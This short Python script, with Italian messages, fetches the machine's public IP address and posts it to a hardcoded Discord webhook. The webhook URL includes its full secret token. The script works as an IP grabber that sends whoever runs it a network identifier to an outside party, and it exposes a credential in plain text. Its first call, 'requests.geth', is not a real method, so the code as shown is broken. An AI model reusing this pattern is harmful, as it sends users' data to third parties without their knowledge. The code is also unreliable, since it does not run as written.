import requests
ip = requests.geth("https://api.ipify.org").text
payload = {
    "content" : f"My IP address is {ip}"
}
response = requests.post("https://discord.com/api/webhooks/1181887539720749108/JGzvwv4hUWfn4HQapBSD2LMimd6hD2rx9AV95S_PDPCNHWtkDoxPmrt70b1s8wj4Ok18" , json=payload)
if response.status_code == 200:
    print("Il messaggio è stato inviato con successo")
else:
    print("Il messaggio non è stato inviato con successo")